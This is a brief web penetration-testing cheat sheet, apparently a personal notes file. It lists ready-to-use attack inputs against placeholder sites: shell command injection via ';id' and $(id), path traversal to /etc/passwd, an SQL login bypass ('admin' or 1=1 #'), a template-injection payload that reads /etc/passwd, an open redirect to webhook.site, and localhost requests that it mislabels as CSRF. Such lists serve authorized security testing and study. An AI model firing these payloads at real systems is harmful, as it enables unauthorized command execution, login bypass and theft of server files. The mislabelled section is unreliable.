# Misc checks (for Web Pen Testing)

# Command Execution tips:
	- Test.com/?ip=127.0.0.1;id
	- Test.com/?ip=127.0.0.1`id`
	- Test.com/?ip=127.0.0.1$(id)

# Path Traversal examples:
	- test.com/file.php?file=../../../../../etc/passwd
	- test.com/file.php?file=/var/www/../../../../../../../etc/passwd
	- test.com/file.php?file=../../../../../etc/passwd%00

# SQLi
Bypassing a login page:
	- admin' or 1=1 #
	- Admin" or 1=1 #

# Server Side Template Injection
You may need to change the value from 1, 2, 3 and so on to get the list of interesting functions:
	- test.com/%7B%7B%20''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()%20%7D%7D
	
	
# Open Redirects
Using Webhook.site:
- Test.com/redirect.php?uri=//webhook.site/18492768-5460-4681-b330-524f00385eae

# CSRF:
- Test.com/?url=http://127.0.0.1:1234/hacker.txt
- Test.com/?url=http://localhost:1234/hacker.txt
- Test.com/?url=http://0.0.0.0:1234/hacker.txt

To be continued. @sinfulz
